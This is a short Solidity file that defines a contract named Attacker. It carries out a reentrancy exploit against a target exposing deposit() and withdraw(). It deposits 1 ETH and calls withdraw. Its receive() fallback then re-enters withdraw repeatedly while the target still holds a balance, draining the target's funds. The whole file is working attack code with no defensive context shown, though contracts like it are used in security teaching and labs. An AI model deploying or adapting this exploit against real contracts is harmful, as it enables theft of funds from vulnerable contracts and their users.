// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IVulnerable {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    IVulnerable public target;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}
